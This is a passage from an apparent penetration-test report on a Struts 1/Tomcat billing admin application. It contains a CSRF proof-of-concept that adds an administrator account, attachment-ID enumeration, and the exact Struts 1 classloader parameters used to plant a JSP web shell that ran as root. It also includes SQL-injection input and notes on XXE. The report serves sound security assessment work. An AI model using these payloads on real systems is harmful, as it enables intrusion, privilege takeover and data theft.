<a class="sourceLine" id="cb8-17" data-line-number="17"><span class="kw">&lt;h3&gt;</span>Apache Tomcat/8.0.47<span class="kw">&lt;/h3&gt;</span></a>
<a class="sourceLine" id="cb8-18" data-line-number="18"><span class="kw">&lt;/body&gt;&lt;/html&gt;</span></a></code></pre></div>
<ul>
<li>Visiting the login page identified the use of struts1 through the default extension “.do”</li>
<li>Wappalyzer identified a number of third party plugins:
<ul>
<li>Use of Java (also inferred through the use of struts1 and Tomcat)</li>
<li>New Relic Analytics</li>
<li>The DataTables, JQuery 1.12.2, JQueryUI JavaScript frameworks</li>
<li>TinyMCE rich text editor</li>
<li>Google Maps location services</li>
</ul></li>
<li>The application did not perform business logic checks to ensure that sell price inc GST is equal to sell price ex GST + 10%. It was possible to enter any value into either field without consideration for the other. For example the application would accept the following input:</li>
</ul>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">Sell Price</th>
<th style="text-align: center;">Sell Price + GST</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">$200</td>
<td style="text-align: center;">$5</td>
</tr>
</tbody>
</table>
<h3 id="examine-authentication-and-session-management">Examine authentication and session management</h3>
<p>The tester reviewed the authentication and session management functions:</p>
<ul>
<li>The application requires a username/password to authenticate.</li>
<li>The application uses the JSESSIONID cookie to track session state. It does not set any other cookies.</li>
<li>The following attributes were set for the JSESSIONID:
<ul>
<li>HttpOnly</li>
<li>Secure</li>
<li>Path=/cortel-admin</li>
<li>Samesite was NOT set</li>
</ul></li>
<li>The application changes the session cookie on login and invalidates the old value.</li>
<li>The application does not set directives to prevent caching. The authenticated area can be viewed by clicking back in the browser.</li>
<li>The application changes the session cookie at logout and invalidates the old value.</li>
</ul>
<h2 id="examine-user-searchviewadd-features">Examine user search/view/add features</h2>
<p>The tester reviewed the search/view/add user features and noted:</p>
<ul>
<li>The search user feature could be scripted to find any user by searching for the first letter and iterating through the different combinations of the ‘effective’ and ‘admin’ search attributes.</li>
<li>The password field could be inspected to reveal a user’s password in the browser.</li>
</ul>
<figure>
<img src="images/exposed_password.png" title="Passwords exposed to users" alt="exposed_password" /><figcaption>exposed_password</figcaption>
</figure>
<ul>
<li>There was a “Generic password generator” at the top of the application that generated pseudo random passwords with a length of 12.</li>
<li>There was no enforced password complexity. The system accepted a password of “a” when creating an administrator account.</li>
<li>There did not appear to be any protections against CSRF on the add administrator account.</li>
</ul>
<h3 id="exploit-csrf-to-gain-access">Exploit CSRF to gain access</h3>
<p>The tester tested the add user feature for CSRF:</p>
<ul>
<li>Used the CSRF PoC generator to create a CSRF PoC for burp.</li>
</ul>
<div class="sourceCode" id="cb9"><pre class="sourceCode html"><code class="sourceCode html"><a class="sourceLine" id="cb9-1" data-line-number="1"><span class="kw">&lt;html&gt;</span></a>
<a class="sourceLine" id="cb9-2" data-line-number="2">  <span class="co">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></a>
<a class="sourceLine" id="cb9-3" data-line-number="3">  <span class="kw">&lt;body&gt;</span></a>
<a class="sourceLine" id="cb9-4" data-line-number="4">  <span class="kw">&lt;script&gt;</span><span class="va">history</span>.<span class="at">pushState</span>(<span class="st">&#39;&#39;</span><span class="op">,</span> <span class="st">&#39;&#39;</span><span class="op">,</span> <span class="st">&#39;/&#39;</span>)<span class="kw">&lt;/script&gt;</span></a>
<a class="sourceLine" id="cb9-5" data-line-number="5">    <span class="kw">&lt;form</span><span class="ot"> action=</span><span class="st">&quot;https://13.54.255.86/cortel-admin/user/addAdminUser.do&quot;</span><span class="ot"> method=</span><span class="st">&quot;POST&quot;</span><span class="kw">&gt;</span></a>
<a class="sourceLine" id="cb9-6" data-line-number="6">      <span class="kw">&lt;input</span><span class="ot"> type=</span><span class="st">&quot;hidden&quot;</span><span class="ot"> name=</span><span class="st">&quot;admin&quot;</span><span class="ot"> value=</span><span class="st">&quot;true&quot;</span> <span class="kw">/&gt;</span></a>
<a class="sourceLine" id="cb9-7" data-line-number="7">      <span class="kw">&lt;input</span><span class="ot"> type=</span><span class="st">&quot;hidden&quot;</span><span class="ot"> name=</span><span class="st">&quot;effective&quot;</span><span class="ot"> value=</span><span class="st">&quot;true&quot;</span> <span class="kw">/&gt;</span></a>
<a class="sourceLine" id="cb9-8" data-line-number="8">      <span class="kw">&lt;input</span><span class="ot"> type=</span><span class="st">&quot;hidden&quot;</span><span class="ot"> name=</span><span class="st">&quot;username&quot;</span><span class="ot"> value=</span><span class="st">&quot;evil&quot;</span> <span class="kw">/&gt;</span></a>
<a class="sourceLine" id="cb9-9" data-line-number="9">      <span class="kw">&lt;input</span><span class="ot"> type=</span><span class="st">&quot;hidden&quot;</span><span class="ot"> name=</span><span class="st">&quot;password&quot;</span><span class="ot"> value=</span><span class="st">&quot;GNI3EIKIBCZiJkEnjxEPqme7&quot;</span> <span class="kw">/&gt;</span></a>
<a class="sourceLine" id="cb9-10" data-line-number="10">      <span class="kw">&lt;input</span><span class="ot"> type=</span><span class="st">&quot;hidden&quot;</span><span class="ot"> name=</span><span class="st">&quot;btn</span><span class="dv">&amp;#95;</span><span class="st">submit</span><span class="dv">&amp;#46;</span><span class="st">null&quot;</span><span class="ot"> value=</span><span class="st">&quot;Add</span><span class="dv">&amp;#32;</span><span class="st">Admin</span><span class="dv">&amp;#32;</span><span class="st">User&quot;</span> <span class="kw">/&gt;</span></a>
<a class="sourceLine" id="cb9-11" data-line-number="11">      <span class="kw">&lt;input</span><span class="ot"> type=</span><span class="st">&quot;submit&quot;</span><span class="ot"> value=</span><span class="st">&quot;Submit request&quot;</span> <span class="kw">/&gt;</span></a>
<a class="sourceLine" id="cb9-12" data-line-number="12">    <span class="kw">&lt;/form&gt;</span></a>
<a class="sourceLine" id="cb9-13" data-line-number="13">  <span class="kw">&lt;/body&gt;</span></a>
<a class="sourceLine" id="cb9-14" data-line-number="14"><span class="kw">&lt;/html&gt;</span></a></code></pre></div>
<ul>
<li>Copy the test URL into Firefox. In a real world scenario the HTML code above would be embedded into a malicious site and JavaScript included to auto submit the form so that no user interaction is required beyond visiting the malicious site while logged in.</li>
</ul>
<figure>
<img src="images/copy_into_browser.png" title="Copying the attack URL into browser" alt="copy_into_browser" /><figcaption>copy_into_browser</figcaption>
</figure>
<figure>
<img src="images/launch_attack.png" title="The attack is launched by clicking on the submit button" alt="launch_attack" /><figcaption>launch_attack</figcaption>
</figure>
<ul>
<li>Clicked the link to trigger the form submission and execute the attack. The account was created.</li>
</ul>
<figure>
<img src="images/csrf_success.png" title="The attack is successful, and the account created" alt="csrf_success" /><figcaption>csrf_success</figcaption>
</figure>
<h3 id="extract-data-from-application">Extract data from application</h3>
<p>The tester found a feature to download attachments in the application at: https://13.54.255.86/cortel-admin/common/downloadAttachment.do?binaryAttachmentId=127389. The request URL included a parameter binaryAttachmentId=16617. The tester used burp intruder to iterate through all numeric ids from 1 to 300,000 and found that the application had a record of attachments starting from 9229 and incrementing until 149153. The response identified the uploaded filename and extension in the “Content-disposition” header, and the content in the response body. The tester noted that the last few requests were for attachments they had uploaded, further supporting the theory that the ID is incremented with each upload.</p>
<pre><code>HTTP/1.1 200 OK
Content-disposition: attachment; filename=&quot;nmap.tcp.full.log.nmap&quot;
Content-Type: application/octet-stream
Content-Length: 144
Date: Mon, 23 Oct 2017 07:50:04 GMT
Connection: close
Server: BTB Australia

# Nmap 6.49BETA4 scan initiated Mon Oct 23 13:37:47 2017 as: nmap -T2 -Pn -p- -oA nmap.tcp.full.log 103.55.76.16/29 103.74.184.248 103.55.76.98</code></pre>
<p>149153 files were recovered including financial records.</p>
<h3 id="test-for-struts-1-classloader-vulnerability">Test for struts 1 classloader vulnerability</h3>
<p>Having observed the use of the “.do” extension, the tester was able to deduce that the application made use of the struts1 framework (BTB had also disclosed this information previously). Stuts1 has an unpatched vulnerability, CVE-2014-0114 (https://www.cvedetails.com/cve/CVE-2014-0114/), which was discovered after the framework was marked for end-of-life.</p>
<p>To test for the vulnerability the following request was made and confirmation received that the server was vulnerable was received via a 500 error.</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode html"><code class="sourceCode html"><a class="sourceLine" id="cb11-1" data-line-number="1">GET /cortel-admin/security/showLoginAdmin.do?class.classLoader.resources=ROOTEDCON HTTP/1.1</a>
<a class="sourceLine" id="cb11-2" data-line-number="2">Host: 13.54.255.86</a>
<a class="sourceLine" id="cb11-3" data-line-number="3">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0</a>
<a class="sourceLine" id="cb11-4" data-line-number="4">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</a>
<a class="sourceLine" id="cb11-5" data-line-number="5">Accept-Language: en-US,en;q=0.5</a>
<a class="sourceLine" id="cb11-6" data-line-number="6">Accept-Encoding: gzip, deflate</a>
<a class="sourceLine" id="cb11-7" data-line-number="7">Cookie: JSESSIONID=5B56673D287E7E9B6AB5A8C88AE02EBA; JSESSIONID=32A94721FDF0F7BC669975B435</a>
<a class="sourceLine" id="cb11-8" data-line-number="8">Connection: close</a>
<a class="sourceLine" id="cb11-9" data-line-number="9">Upgrade-Insecure-Requests: 1</a>
<a class="sourceLine" id="cb11-10" data-line-number="10"></a>
<a class="sourceLine" id="cb11-11" data-line-number="11"></a>
<a class="sourceLine" id="cb11-12" data-line-number="12">HTTP/1.1 500 Internal Server Error</a>
<a class="sourceLine" id="cb11-13" data-line-number="13">Content-Type: text/html</a>
<a class="sourceLine" id="cb11-14" data-line-number="14">Content-Length: 0</a>
<a class="sourceLine" id="cb11-15" data-line-number="15">Date: Tue, 24 Oct 2017 04:49:49 GMT</a>
<a class="sourceLine" id="cb11-16" data-line-number="16">Connection: close</a>
<a class="sourceLine" id="cb11-17" data-line-number="17">Server: BTB Australia</a></code></pre></div>
<p>The next step was to build a test lab so that an exploit could developed and tested (experience on a previous test showed that the metasploit module was unreliable). Apache Tomcat 8.0.47 and Struts 1.3.10 were used to build the environment, with a vulnerable application downloaded from <a href="https://github.com/julianvilas/rooted2k15/" class="uri">https://github.com/julianvilas/rooted2k15/</a> for testing.</p>
<p>After some work the tester was able to develop a working exploit that worked in two parts. The first part utilised the classloader vulnerability to set the following values for the default AccessLogValve used by the Tomcat server:</p>
<ul>
<li>class.classLoader.resources.context.parent.pipeline.first.pattern=combined</li>
<li>class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT</li>
<li>class.classLoader.resources.context.parent.pipeline.first.prefix=evil_shell</li>
<li>class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp</li>
<li>class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=4</li>
</ul>
<p>This set the log location to a known file in a directory accessible via HTTPS (i.e. https://13.54.255.86/evil_shell4.jsp) and the logging format to “combined mode”, which includes the User-Agent header.</p>
<p>The second part of the exploit was to develop a one-line JSP shell and embed it in the User-Agent HTTP header, so that when the log file was requested, the embedded JSP would be executed.</p>
<p>The final exploit sent to the server and response are below:</p>
<figure>
<img src="images/exploit_struts1.png" title="Exploit struts1 to setup a webshell" alt="exploit_struts1.png" /><figcaption>exploit_struts1.png</figcaption>
</figure>
<p>Once the request had been completed, the shell was created at https://13.54.255.86/evil_shell4.jsp, which was used to execute further commands against the server.</p>
<figure>
<img src="images/completed_poc.png" title="PoC showing the current working directory" alt="completed_poc.png" /><figcaption>completed_poc.png</figcaption>
</figure>
<h3 id="post-exploitation-of-struts-1-classloader">Post exploitation of struts 1 classloader</h3>
<p>Having proved code execution the tester downloaded and modified the <a href="https://github.com/garbr0/hentix">hentix tool</a> to execute commands against the server as if they were at the console. Source code modified has been included in <a href="##%20Appendix%20-%20Modifications%20to%20hentix">Appendix - Modifications to hentix</a>.</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb12-1" data-line-number="1"><span class="ex">webshell</span>$ uname -a</a>
<a class="sourceLine" id="cb12-2" data-line-number="2"></a>
<a class="sourceLine" id="cb12-3" data-line-number="3"><span class="ex">Linux</span> f970343092ea 4.4.0-1022-aws <span class="co">#31-Ubuntu SMP Tue Jun 27 11:27:55 UTC 2017 x86_64 GNU/Linux</span></a>
<a class="sourceLine" id="cb12-4" data-line-number="4"></a>
<a class="sourceLine" id="cb12-5" data-line-number="5"><span class="ex">webshell</span>$ ip add show</a>
<a class="sourceLine" id="cb12-6" data-line-number="6"></a>
<a class="sourceLine" id="cb12-7" data-line-number="7"><span class="ex">1</span>: lo: <span class="op">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="op">&gt;</span> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</a>
<a class="sourceLine" id="cb12-8" data-line-number="8">    <span class="ex">link/loopback</span> 00:00:00:00:00:00 brd 00:00:00:00:00:00</a>
<a class="sourceLine" id="cb12-9" data-line-number="9">    <span class="ex">inet</span> 127.0.0.1/8 scope host lo</a>
<a class="sourceLine" id="cb12-10" data-line-number="10">        <span class="ex">valid_lft</span> forever preferred_lft</a>
<a class="sourceLine" id="cb12-11" data-line-number="11"><span class="ex">forever80</span>: eth0@if81: <span class="op">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="op">&gt;</span> mtu 1500 qdisc noqueue state UP group default</a>
<a class="sourceLine" id="cb12-12" data-line-number="12">    <span class="ex">link/ether</span> 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0</a>
<a class="sourceLine" id="cb12-13" data-line-number="13">    <span class="ex">inet</span> 172.17.0.2/16 scope global eth0</a>
<a class="sourceLine" id="cb12-14" data-line-number="14">        <span class="ex">valid_lft</span> forever preferred_lft forever</a>
<a class="sourceLine" id="cb12-15" data-line-number="15"></a>
<a class="sourceLine" id="cb12-16" data-line-number="16"><span class="ex">webshell</span>$ id</a>
<a class="sourceLine" id="cb12-17" data-line-number="17"></a>
<a class="sourceLine" id="cb12-18" data-line-number="18"><span class="va">uid=</span>0<span class="va">(</span>root<span class="va">)</span> <span class="va">gid=</span>0<span class="va">(</span>root<span class="va">)</span> <span class="va">groups=</span>0<span class="va">(</span>root<span class="va">)</span></a>
<a class="sourceLine" id="cb12-19" data-line-number="19"></a>
<a class="sourceLine" id="cb12-20" data-line-number="20"><span class="ex">webshell</span>$ ls webapps/cortel-admin/WEB-INF</a>
<a class="sourceLine" id="cb12-21" data-line-number="21"></a>
<a class="sourceLine" id="cb12-22" data-line-number="22"><span class="ex">application</span>         client              dtd             index.jsp       rateplan        tags            web.xml</a>
<a class="sourceLine" id="cb12-23" data-line-number="23"><span class="ex">billing</span>             common              email           lib             report          test            web.xml.bak</a>
<a class="sourceLine" id="cb12-24" data-line-number="24"><span class="ex">bureau_reporting</span>    credit_management   error.jsp       macs            security        tld</a>
<a class="sourceLine" id="cb12-25" data-line-number="25"><span class="ex">classes</span>             dealer              event           provisioning    supplier        user</a>
<a class="sourceLine" id="cb12-26" data-line-number="26"></a>
<a class="sourceLine" id="cb12-27" data-line-number="27"><span class="ex">webshell</span>$</a></code></pre></div>
<p>The tester downloaded the contents of the /usr/local/tomcat directory and inspected the contents. 1490 Java “.class” files were discovered, which were decompiled using jd and saved for further analysis.</p>
<figure>
<img src="images/decompiled_java.png" title="Using JD to decompile discovered .class files to Java" alt="decompiled_java.png" /><figcaption>decompiled_java.png</figcaption>
</figure>
<h3 id="review-source-code">Review source code</h3>
<p>With decompiled source code, the tester switched the focus of the assessment to source code review to make best use of remaining time and find as many issues as possible. Exploitation was not performed as there was limited time left on the assessment, and a development environment was not available to check back-end systems.</p>
<h4 id="libraries-in-use">Libraries in use</h4>
<p>The tester confirmed the libraries in use and checked them for vulnerabilities:</p>
<ul>
<li>struts version 1.X has a critical vulnerability and is unsupported.</li>
<li>Apache common collections version 3.1 has a critical vulnerability patched in version 3.2 that could allow code execution when de-serialising user controlled inputs. No instances of serialisation were identified during application reconnaissance.</li>
<li>A scan of the libraries using OWASP Dependency Check identified a total of 419 vulnerabilities across 9 dependencies, with the following having a high severity:
<ul>
<li>commons-beanutils-1.7.0.jar</li>
<li>commons-collections-3.1.jar</li>
<li>commons-fileupload-1.0.jar</li>
<li>mysql-connector-java-5.1.7-bin.jar</li>
<li>spring-core-4.1.6.RELEASE.jar</li>
<li>standard.jar</li>
<li>struts-1.2.9.jar</li>
</ul></li>
</ul>
<h4 id="command-xpath-and-ldap-injection">Command, XPath and LDAP injection</h4>
<ul>
<li>System calls were found within unit tests, but the commands were a static string</li>
<li>No usage of XPath was discovered</li>
<li>No usage of LDAP was discovered</li>
</ul>
<h4 id="xml-injection">XML Injection</h4>
<p>Two potential instances of XML injection were discovered.</p>
<ul>
<li>In NABPayment.class the makePayment function uses string concatenation to build the XML request for payment without any apparent attempt to XML escape the input (see below)</li>
<li>The same issue was discovered in NABPaymentIndividualDD.class</li>
</ul>
<div class="sourceCode" id="cb13"><pre class="sourceCode java"><code class="sourceCode java"><a class="sourceLine" id="cb13-1" data-line-number="1"></a>
<a class="sourceLine" id="cb13-2" data-line-number="2"><span class="kw">public</span> BillPaymentResult <span class="fu">makePayment</span>(Money amountPaid, <span class="bu">String</span> cardNumber, <span class="bu">String</span> cvv, <span class="bu">String</span> expiryMonth, <span class="bu">String</span> expiryYear, <span class="bu">String</span> name, <span class="bu">String</span> cidn, <span class="bu">String</span> billId, SystemParamService systemParamService)</a>
<a class="sourceLine" id="cb13-3" data-line-number="3">  {</a>
<a class="sourceLine" id="cb13-4" data-line-number="4">    <span class="bu">String</span> xmlString = <span class="st">&quot;&lt;?xml version=</span><span class="sc">\&quot;</span><span class="st">1.0</span><span class="sc">\&quot;</span><span class="st"> encoding=</span><span class="sc">\&quot;</span><span class="st">UTF-8</span><span class="sc">\&quot;</span><span class="st">?&gt;&lt;NABTransactMessage&gt;&lt;MessageInfo&gt;&lt;timeoutValue&gt;60&lt;/timeoutValue&gt;&lt;apiVersion&gt;xml-4.2&lt;/apiVersion&gt;&lt;/MessageInfo&gt;&lt;MerchantInfo&gt;  &lt;merchantID&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb13-5" data-line-number="5">    </a>
<a class="sourceLine" id="cb13-6" data-line-number="6">      <span class="bu">System</span>.<span class="fu">getProperty</span>(<span class="st">&quot;nabMerchant&quot;</span>) + </a>
<a class="sourceLine" id="cb13-7" data-line-number="7">      <span class="st">&quot;&lt;/merchantID&gt;  &lt;password&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb13-8" data-line-number="8">      <span class="bu">System</span>.<span class="fu">getProperty</span>(<span class="st">&quot;nabPassword&quot;</span>) + </a>
<a class="sourceLine" id="cb13-9" data-line-number="9">      <span class="st">&quot;&lt;/password&gt; &lt;/MerchantInfo&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb13-10" data-line-number="10">      <span class="st">&quot;&lt;RequestType&gt;Payment&lt;/RequestType&gt;&lt;Payment&gt;&lt;TxnList count=</span><span class="sc">\&quot;</span><span class="st">1</span><span class="sc">\&quot;</span><span class="st">&gt;&lt;Txn ID=</span><span class="sc">\&quot;</span><span class="st">1</span><span class="sc">\&quot;</span><span class="st">&gt;&lt;txnType&gt;0&lt;/txnType&gt;&lt;txnSource&gt;23&lt;/txnSource&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb13-11" data-line-number="11">      <span class="st">&quot;&lt;amount&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb13-12" data-line-number="12">      amountPaid.<span class="fu">getCents</span>() + </a>
<a class="sourceLine" id="cb13-13" data-line-number="13">      <span class="st">&quot;&lt;/amount&gt;&lt;currency&gt;AUD&lt;/currency&gt;&lt;CreditCardInfo&gt;&lt;cardNumber&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb13-14" data-line-number="14">      cardNumber + </a>
<a class="sourceLine" id="cb13-15" data-line-number="15">      <span class="st">&quot;&lt;/cardNumber&gt;&lt;cvv&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb13-16" data-line-number="16">      cvv + </a>
<a class="sourceLine" id="cb13-17" data-line-number="17">      <span class="st">&quot;&lt;/cvv&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb13-18" data-line-number="18">      <span class="st">&quot;&lt;expiryDate&gt;&quot;</span> + (</a>
<a class="sourceLine" id="cb13-19" data-line-number="19">      expiryMonth.<span class="fu">length</span>() &lt; <span class="dv">2</span> ? <span class="st">&quot;0&quot;</span> + expiryMonth : expiryMonth) + </a>
<a class="sourceLine" id="cb13-20" data-line-number="20">      <span class="st">&quot;/&quot;</span> + (</a>
<a class="sourceLine" id="cb13-21" data-line-number="21">      expiryYear.<span class="fu">length</span>() == <span class="dv">4</span> ? expiryYear.<span class="fu">substring</span>(<span class="dv">2</span>) : </a>
<a class="sourceLine" id="cb13-22" data-line-number="22">      expiryYear) + </a>
<a class="sourceLine" id="cb13-23" data-line-number="23">      <span class="st">&quot;&lt;/expiryDate&gt;&lt;cardHolderName&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb13-24" data-line-number="24">      name.<span class="fu">replaceAll</span>(<span class="st">&quot;&amp;&quot;</span>, <span class="st">&quot;&amp;amp;&quot;</span>) + </a>
<a class="sourceLine" id="cb13-25" data-line-number="25">      <span class="st">&quot;&lt;/cardHolderName&gt;&lt;recurringflag&gt;no&lt;/recurringflag&gt; &quot;</span> + </a>
<a class="sourceLine" id="cb13-26" data-line-number="26">      <span class="st">&quot;&lt;purchaseOrderNo&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb13-27" data-line-number="27">      cidn + </a>
<a class="sourceLine" id="cb13-28" data-line-number="28">      <span class="st">&quot;:&quot;</span> + </a>
<a class="sourceLine" id="cb13-29" data-line-number="29">      billId + </a>
<a class="sourceLine" id="cb13-30" data-line-number="30">      <span class="st">&quot;&lt;/purchaseOrderNo&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb13-31" data-line-number="31">      <span class="st">&quot;&lt;/CreditCardInfo&gt;&lt;/Txn&gt;&lt;/TxnList&gt;&lt;/Payment&gt;&lt;/NABTransactMessage&gt;&quot;</span>;</a></code></pre></div>
<p>As these functions are related to payments, these weaknesses may be exploited to modify payment information and commit fraud.</p>
<h4 id="xml-entity-injection">XML Entity Injection</h4>
<p>One potential instance of XML external entity injection was discovered in the getBPayments method of EziDebtPaymentImpl.class. The DOM Parser was not configured to disable external entity processing after creation, and the remote DTD is supplied to the parser.</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode java"><code class="sourceCode java"><a class="sourceLine" id="cb14-1" data-line-number="1">  <span class="kw">public</span> <span class="bu">List</span>&lt;<span class="bu">String</span>&gt; <span class="fu">getBPayments</span>(SystemParamService systemParamService)</a>
<a class="sourceLine" id="cb14-2" data-line-number="2">  {</a>
<a class="sourceLine" id="cb14-3" data-line-number="3">    DOMParser parser = <span class="kw">new</span> <span class="fu">DOMParser</span>();</a>
<a class="sourceLine" id="cb14-4" data-line-number="4">    <span class="co">// Missing configuration as per https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</span></a>
<a class="sourceLine" id="cb14-5" data-line-number="5">    <span class="bu">List</span>&lt;<span class="bu">String</span>&gt; ret = <span class="kw">new</span> <span class="bu">ArrayList</span>();</a>
<a class="sourceLine" id="cb14-6" data-line-number="6">    <span class="kw">try</span></a>
<a class="sourceLine" id="cb14-7" data-line-number="7">    {</a>
<a class="sourceLine" id="cb14-8" data-line-number="8">      PaymentExchangeLocator pel = <span class="kw">new</span> <span class="fu">PaymentExchangeLocator</span>();</a>
<a class="sourceLine" id="cb14-9" data-line-number="9">      pel.<span class="fu">setPaymentExchangeSoapEndpointAddress</span>(systemParamService.<span class="fu">getSystemParamString</span>(SystemParamKey.<span class="fu">EZIDEBIT_SERVER_URL</span>));</a>
<a class="sourceLine" id="cb14-10" data-line-number="10">      PaymentExchangeSoap pes = pel.<span class="fu">getPaymentExchangeSoap</span>();</a>
<a class="sourceLine" id="cb14-11" data-line-number="11">      <span class="bu">Calendar</span> cal = <span class="bu">Calendar</span>.<span class="fu">getInstance</span>();</a>
<a class="sourceLine" id="cb14-12" data-line-number="12">      cal.<span class="fu">add</span>(<span class="dv">5</span>, <span class="dv">-7</span>);</a>
<a class="sourceLine" id="cb14-13" data-line-number="13">      <span class="bu">String</span> result = pes.<span class="fu">getPaymentsExXmlString</span>(systemParamService.<span class="fu">getSystemParamString</span>(SystemParamKey.<span class="fu">EZIDEBIT_KEY</span>), <span class="st">&quot;ALL&quot;</span>, <span class="st">&quot;ALL&quot;</span>, <span class="st">&quot;ALL&quot;</span>, <span class="st">&quot;&quot;</span>, DateUtil.<span class="fu">safeFormatDate</span>(cal.<span class="fu">getTime</span>(), DateFormatKey.<span class="fu">DATE_FORMAT_YYYY_MM_DD</span>), DateUtil.<span class="fu">safeFormatDate</span>(<span class="kw">new</span> <span class="bu">Date</span>(), DateFormatKey.<span class="fu">DATE_FORMAT_YYYY_MM_DD</span>), <span class="st">&quot;SETTLEMENT&quot;</span>, <span class="st">&quot;&quot;</span>, <span class="st">&quot;&quot;</span>);</a>
<a class="sourceLine" id="cb14-14" data-line-number="14">      </a>
<a class="sourceLine" id="cb14-15" data-line-number="15">      <span class="co">// Remote DTD in supplied to parser.</span></a>
<a class="sourceLine" id="cb14-16" data-line-number="16">      <span class="bu">ByteArrayInputStream</span> bis = <span class="kw">new</span> <span class="bu">ByteArrayInputStream</span>((<span class="st">&quot;&lt;?xml version=</span><span class="sc">\&quot;</span><span class="st">1.0</span><span class="sc">\&quot;</span><span class="st"> encoding=</span><span class="sc">\&quot;</span><span class="st">ISO-8859-1</span><span class="sc">\&quot;</span><span class="st">?&gt;</span><span class="sc">\n</span><span class="st">&quot;</span> + result).<span class="fu">getBytes</span>());</a>
<a class="sourceLine" id="cb14-17" data-line-number="17">      <span class="bu">InputSource</span> is = <span class="kw">new</span> <span class="bu">InputSource</span>(bis);</a>
<a class="sourceLine" id="cb14-18" data-line-number="18">      parser.<span class="fu">parse</span>(is);</a></code></pre></div>
<p>Exploitation could result in disclosure of system files, server side request forgery (including port scanning) or denial of service.</p>
<h4 id="sql-injection">SQL Injection</h4>
<p>Several instance of unsafe string concatenation were discovered that could lead to SQL injection.</p>
<ul>
<li>Method uploadAndProcess in ReferenceDataImporter.class: the contents of a file which includes wholesaler information is read, parsed, and a number of queries executed using the data without validation. The logic related to parsing the file was complex and it wasn’t clear under what conditions could be exploited.</li>
</ul>
<div class="sourceCode" id="cb15"><pre class="sourceCode java"><code class="sourceCode java"><a class="sourceLine" id="cb15-1" data-line-number="1">        <span class="bu">String</span> firstToken = csvTokenizer.<span class="fu">nextElement</span>().<span class="fu">toString</span>();</a>
<a class="sourceLine" id="cb15-2" data-line-number="2"></a>
<a class="sourceLine" id="cb15-3" data-line-number="3">        <span class="kw">... </span>snip ...</a>
<a class="sourceLine" id="cb15-4" data-line-number="4"></a>
<a class="sourceLine" id="cb15-5" data-line-number="5">        <span class="kw">else</span> <span class="kw">if</span> (currentTable.<span class="fu">equals</span>(<span class="st">&quot;ref_wholesaler&quot;</span>))</a>
<a class="sourceLine" id="cb15-6" data-line-number="6">        {</a>
<a class="sourceLine" id="cb15-7" data-line-number="7">          <span class="bu">Statement</span> stmt = (<span class="bu">Statement</span>)conn.<span class="fu">createStatement</span>();</a>
<a class="sourceLine" id="cb15-8" data-line-number="8">          <span class="bu">ResultSet</span> rs = stmt.<span class="fu">executeQuery</span>(<span class="st">&quot;SELECT * FROM ref_wholesaler where code = &#39;&quot;</span> + firstToken + <span class="st">&quot;&#39;&quot;</span>);</a>
<a class="sourceLine" id="cb15-9" data-line-number="9">          <span class="kw">if</span> (!rs.<span class="fu">next</span>())</a>
<a class="sourceLine" id="cb15-10" data-line-number="10">          {</a>
<a class="sourceLine" id="cb15-11" data-line-number="11">            LOG.<span class="fu">debug</span>(<span class="st">&quot;Adding to &quot;</span> + <span class="kw">this</span>.<span class="fu">properties</span>.<span class="fu">getProperty</span>(<span class="st">&quot;DATABASE&quot;</span>) + <span class="st">&quot; : class com.a3.domain.common.Wholesaler : &quot;</span> + firstToken);</a>
<a class="sourceLine" id="cb15-12" data-line-number="12">            stmt.<span class="fu">executeUpdate</span>(<span class="st">&quot;INSERT INTO ref_wholesaler VALUES (&#39;&quot;</span> + firstToken + <span class="st">&quot;&#39;,&#39;&quot;</span> + csvTokenizer.<span class="fu">nextElement</span>().<span class="fu">toString</span>() + </a>
<a class="sourceLine" id="cb15-13" data-line-number="13">              <span class="st">&quot;&#39;,&#39;&quot;</span> + csvTokenizer.<span class="fu">nextElement</span>().<span class="fu">toString</span>() + <span class="st">&quot;&#39;,&#39;system&#39;,&#39;&quot;</span> + file_date + <span class="st">&quot;&#39;)&quot;</span>);</a>
<a class="sourceLine" id="cb15-14" data-line-number="14">          }</a>
<a class="sourceLine" id="cb15-15" data-line-number="15">        }</a></code></pre></div>
<ul>
<li>Method doesServiceNumbersExist in ServiceNumberDirectDAO.class: the supplied list of service numbers may be user controlled. When entering service numbers, input validation checks allowed entry of “78654a’) or (‘1’=’1”.</li>
</ul>
<div class="sourceCode" id="cb16"><pre class="sourceCode java"><code class="sourceCode java"><a class="sourceLine" id="cb16-1" data-line-number="1">  <span class="kw">public</span> <span class="dt">boolean</span> <span class="fu">doesServiceNumbersExist</span>(<span class="bu">String</span> db, <span class="bu">List</span>&lt;<span class="bu">String</span>&gt; numbers)</a>
<a class="sourceLine" id="cb16-2" data-line-number="2">    <span class="kw">throws</span> <span class="bu">Exception</span></a>
<a class="sourceLine" id="cb16-3" data-line-number="3">  {</a>
<a class="sourceLine" id="cb16-4" data-line-number="4">    <span class="bu">Connection</span> connection = <span class="fu">getConnection</span>(<span class="kw">false</span>);</a>
